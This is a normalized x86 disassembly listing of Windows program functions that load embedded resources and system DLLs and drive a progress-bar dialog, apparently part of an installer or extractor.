mov ecx [ ebp + 0x8 ]
xor eax eax
cmp ecx [ ebp + 0xc ]
setne al
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
sub_406e10
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
push eax
call sub_423201
add esp 0x4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_423201
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_4121b5
add esp 0x4
mov eax 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x28 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_406ee0
add esp 0x8
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x3c ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call sub_406ee0
add esp 0x8
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4070a0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
push edx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x8 ]
push eax
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x10 ]
sub_406ee0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax + 0xc ] 0x0
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x2e
mov edx [ ebp + 0x8 ]
push edx
call sub_407080
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
cmp edx 0x2a
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov esp ebp
pop ebp
retn
push 0xa
mov ecx [ ebp + 0xc ]
add ecx 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41587f
add esp 0xc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
movsx ecx [ eax + 0x1 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
movsx eax [ edx ]
cmp eax 0x2b
jne r-xdata
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax + 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] 0x7fffffff
mov eax [ ebp + 0xc ]
mov [ eax + 0x4 ] r--data
jmp r-xdata
push r--data
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push ecx
call sub_415610
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] r--data
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
sub eax [ edx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x8 ] eax
push 0xa
mov edx [ ebp + 0xc ]
add edx 0x10
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_41587f
add esp 0xc
mov ecx [ ebp + 0xc ]
mov [ ecx + 0xc ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x10 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
push eax
call sub_412e40
add esp 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov [ edx + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
sub_4070a0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406df0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
push edx
call sub_407180
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push eax
call sub_406df0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_407140
add esp 0x8
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_407140
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
setne al
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_415980
add esp 0x8
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
sub_407180
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
setne al
jmp r-xdata
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax 0x1
mov eax [ ebp + 0x14 ]
neg eax
sbb eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
mov eax [ ebp + 0x10 ]
movsx ecx [ eax ]
cmp edx ecx
jge r-xdata
mov edx [ ebp + 0x8 ]
movsx eax [ edx ]
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx ]
cmp eax edx
jle r-xdata
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x14 ]
sub ecx 0x1
mov [ ebp + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0x10 ]
add eax 0x1
mov [ ebp + 0x10 ] eax
sub_407220
push ebp
mov ebp esp
sub esp 0xc
push 0x0
call [ GetModuleHandleW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
movzx eax [ ebp + 0xc ]
push eax
movzx ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call [ FindResourceW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call [ LoadResource@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
push edx
call [ LockResource@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov edx [ ebp - 0xc ]
push edx
call [ FreeLibrary@IAT ]
mov eax 0x1
mov eax [ ebp - 0xc ]
push eax
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
sub_4072d0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_407220
add esp 0x10
test eax eax
je r-xdata
mov eax 0x11
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4109f0
add esp 0xc
test eax eax
je r-xdata
xor eax eax
mov eax 0x13
jmp r-xdata
sub_407340
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
call sub_409700
test eax eax
je r-xdata
mov eax 0x14
jmp r-xdata
push 0x200
push 0x3ec
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push ecx
call sub_4072d0
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x200
push 0x3ef
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
push edx
call sub_4072d0
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push 0x200
push 0x3ed
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
push eax
call sub_4072d0
add esp 0xc
mov [ ebp - 0x4 ] eax
sub_4073d0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x220 ] ecx
mov eax [ ebp - 0x220 ]
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x220 ]
mov eax [ edx ]
push eax
call sub_40a540
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax 0x14
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0x15
jmp r-xdata
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412e40
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4121b5
add esp 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_406e10
add esp 0x8
mov [ ebp - 0x21c ] eax
cmp [ ebp - 0x21c ] 0x1
jne r-xdata
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x218 ] 0x0
push 0x1ff
push 0x0
lea edx [ ebp - 0x217 ]
push edx
call sub_412f80
add esp 0xc
push 0x1ff
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x218 ]
push ecx
call sub_413d20
add esp 0xc
mov edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x218 ]
push eax
call sub_415a08
add esp 0x8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x16
mov [ ebp - 0xc ] 0x17
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_415980
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call sub_415a08
add esp 0x8
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
sub_407530
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call sub_407620
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
push ecx
call sub_412584
add esp 0x4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40a1d0
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call sub_412584
add esp 0x4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x400
mov edx [ rw-data ]
push edx
call sub_412584
add esp 0x4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov eax 0x6
jmp r-xdata
mov [ rw-data ] 0x400
mov ecx [ rw-data ]
push ecx
call sub_412584
add esp 0x4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xb
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax 0xb
jmp r-xdata
sub_407620
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_40a210
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
push ecx
call sub_4121b5
add esp 0x4
mov [ rw-data ] 0x0
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
push edx
call sub_4121b5
add esp 0x4
mov [ rw-data ] 0x0
sub_407690
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
push edx
call sub_40a780
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push r--data
mov eax [ ebp + 0xc ]
push eax
call sub_412b5e
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x10 ]
call sub_407760
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call sub_412a1c
add esp 0x4
mov eax [ ebp - 0x8 ]
mov eax 0x7
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_407710
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
push edx
call sub_40a780
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_407760
mov eax 0x6
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_407760
push ebp
mov ebp esp
sub esp 0x44
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] 0x0
push 0x30
push 0x0
lea eax [ ebp - 0x38 ]
push eax
call sub_412f80
add esp 0xc
push 0x0
push 0x0
lea ecx [ ebp - 0x38 ]
push ecx
call sub_40a910
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax 0x27
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x8 ]
jge r-xdata
mov [ ebp - 0x3c ] 0x28
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
mov edx [ rw-data ]
mov [ ebp - 0x28 ] edx
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x38 ]
push ecx
call sub_40aac0
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_40c0c0
mov eax [ ebp - 0x3c ]
mov edx [ rw-data ]
sub edx [ ebp - 0x24 ]
mov [ ebp - 0x40 ] edx
je r-xdata
cmp [ ebp - 0x3c ] 0x4
je r-xdata
mov edx [ rw-data ]
push edx
mov eax [ rw-data ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
push ecx
call sub_40a7d0
add esp 0x14
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
cmp [ ebp - 0x3c ] 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
push 0x1
mov ecx [ ebp - 0x40 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_413b0e
add esp 0x10
cmp eax 0x1
je r-xdata
mov [ ebp - 0x3c ] 0x27
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ rw-data ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x34 ] ecx
mov eax 0x6
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x3c ] 0x0
jmp r-xdata
mov [ ebp - 0x3c ] 0x7
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
sub_4078b0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x228 ] ecx
xor eax eax
mov [ ebp - 0x218 ] ax
push 0x208
push 0x0
lea ecx [ ebp - 0x216 ]
push ecx
call sub_412f80
add esp 0xc
push 0x105
lea edx [ ebp - 0x218 ]
push edx
call [ GetSystemDirectoryW@IAT ]
lea eax [ ebp - 0x218 ]
push eax
call sub_411794
add esp 0x4
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
movzx edx [ ebp + ecx * 2 - 0x21a ]
cmp edx 0x5c
je r-xdata
mov [ ebp - 0x21c ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x21c ] 0xc
jae r-xdata
mov eax 0x5c
mov ecx [ ebp - 0x4 ]
mov [ ebp + ecx * 2 - 0x218 ] ax
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x228 ]
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x21c ]
mov edx [ ecx * 4 + rw-data ]
push edx
call sub_411794
add esp 0x4
mov [ ebp - 0x224 ] eax
mov eax 0x104
sub eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x21c ]
mov edx [ ecx * 4 + rw-data ]
push edx
mov eax [ ebp - 0x4 ]
lea ecx [ ebp + eax * 2 - 0x218 ]
push ecx
call sub_4134a9
add esp 0xc
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x224 ]
cmp edx 0x104
ja r-xdata
xor edx edx
mov [ ebp - 0x10 ] dx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x224 ]
xor ecx ecx
mov [ ebp + eax * 2 - 0x218 ] cx
jmp r-xdata
mov eax [ ebp - 0x21c ]
add eax 0x1
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x218 ]
mov [ ebp - 0x220 ] eax
mov ecx [ ebp - 0x220 ]
push ecx
call [ LoadLibraryW@IAT ]
jmp r-xdata
sub_407a20
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x210 ]
push eax
call sub_407aa0
add esp 0x4
test eax eax
jne r-xdata
push 0x4
lea ecx [ ebp - 0x210 ]
push ecx
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
push rw-data
lea edx [ ebp - 0x210 ]
push edx
call sub_4089c0
add esp 0x8
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
xor eax eax
or eax 0xffffffff
jmp r-xdata
sub_407aa0
push ebp
mov ebp esp
push ecx
push 0x104
mov eax [ ebp + 0x8 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
push 0x2e
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404520
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push r--data
mov edx [ ebp - 0x4 ]
add edx 0x2
push edx
call sub_421346
add esp 0x8
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x2
push eax
call sub_412d52
add esp 0x8
mov eax 0x1
sub_407b10
push ebp
mov ebp esp
sub esp 0x8
movzx eax [ ebp + 0x8 ]
mov [ rw-data ] eax
movzx ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x8
mov [ ebp - 0x4 ] 0x20
lea eax [ ebp - 0x8 ]
push eax
call [ InitCommonControlsEx@IAT ]
push 0x0
push sub_407bb0
push 0x0
push 0x65
push 0x0
call [ GetModuleHandleW@IAT ]
push eax
call [ DialogBoxParamW@IAT ]
xor eax eax
call sub_407a20
cmp eax 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
fld [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_407bb0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x110
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407c80
add esp 0x4
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x111
je r-xdata
mov esp ebp
pop ebp
retn 0x10
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x113
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_407c30
add esp 0x4
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ EndDialog@IAT ]
jmp r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
sub_407c30
push ebp
mov ebp esp
sub esp 0x8
fld [ rw-data ]
fadd [ r--data ]
call sub_415ad0
mov [ ebp - 0x8 ] eax
push 0x3e8
mov eax [ ebp + 0x8 ]
push eax
call [ GetDlgItem@IAT ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
push 0x402
mov edx [ ebp - 0x4 ]
push edx
call [ SendMessageW@IAT ]
mov esp ebp
pop ebp
retn
sub_407c80
push ebp
mov ebp esp
sub esp 0x9f4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x24 ] eax
push 0x258
lea eax [ ebp - 0x4d8 ]
push eax
push 0xffffffff
push rw-data
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
push 0x258
lea ecx [ ebp - 0x988 ]
push ecx
push 0xffffffff
push rw-data
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
lea edx [ ebp - 0x4d8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ SetWindowTextW@IAT ]
lea ecx [ ebp - 0x988 ]
push ecx
push 0x3ea
mov edx [ ebp + 0x8 ]
push edx
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowTextW@IAT ]
push 0x3eb
push 0x0
call [ GetModuleHandleW@IAT ]
push eax
call [ LoadIconW@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push 0x3e8
mov edx [ ebp + 0x8 ]
push edx
call [ GetDlgItem@IAT ]
mov [ ebp - 0x18 ] eax
push 0x640000
push 0x0
push 0x401
mov eax [ ebp - 0x18 ]
push eax
call [ SendMessageW@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
push 0x1
push 0x80
mov ecx [ ebp + 0x8 ]
push ecx
call [ SendMessageW@IAT ]
push 0x3ea
mov edx [ ebp + 0x8 ]
push edx
call [ GetDlgItem@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
push eax
call [ GetDC@IAT ]
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push 0x31
mov ecx [ ebp - 0x1c ]
push ecx
call [ SendMessageW@IAT ]
mov [ ebp - 0x9a0 ] eax
cmp [ ebp - 0x9a0 ] 0x0
je r-xdata
push 0xfffffff0
mov ecx [ ebp - 0x18 ]
push ecx
call [ GetWindowLongW@IAT ]
mov [ ebp - 0x9a4 ] eax
mov edx [ ebp - 0x9a4 ]
or edx 0x8
push edx
push 0xfffffff0
mov eax [ ebp - 0x18 ]
push eax
call [ SetWindowLongW@IAT ]
push 0x32
push 0x1
push 0x40a
mov ecx [ ebp - 0x18 ]
push ecx
call [ SendMessageW@IAT ]
push 0x520
lea ecx [ ebp - 0x99c ]
push ecx
push 0xffffffff
lea edx [ ebp - 0x988 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call [ DrawTextW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x9a0 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call [ SelectObject@IAT ]
mov [ ebp - 0x98c ] eax
cmp [ ebp - 0x98c ] 0x0
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x994 ]
sub eax [ ebp - 0x99c ]
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
sub eax ecx
mov [ ebp - 0x9ac ] eax
mov edx [ ebp - 0x990 ]
sub edx [ ebp - 0x998 ]
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
sub edx eax
mov [ ebp - 0x9a8 ] edx
cmp [ ebp - 0x9ac ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call [ ReleaseDC@IAT ]
mov edx [ ebp + 0x8 ]
push edx
call sub_408030
add esp 0x4
push 0x0
push 0x64
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call [ SetTimer@IAT ]
mov ecx [ ebp - 0x24 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x98c ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call [ SelectObject@IAT ]
cmp [ ebp - 0x9a8 ] 0x0
jge r-xdata
mov [ ebp - 0x9ac ] 0x0
cmp [ ebp - 0x9ac ] 0x0
jg r-xdata
mov [ ebp - 0x9a8 ] 0x0
lea ecx [ ebp - 0x9bc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ GetWindowRect@IAT ]
push 0x6
mov eax [ ebp - 0x9b0 ]
sub eax [ ebp - 0x9b8 ]
add eax [ ebp - 0x9a8 ]
push eax
mov ecx [ ebp - 0x9b4 ]
sub ecx [ ebp - 0x9bc ]
add ecx [ ebp - 0x9ac ]
push ecx
push 0x0
push 0x0
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ SetWindowPos@IAT ]
lea eax [ ebp - 0x9cc ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
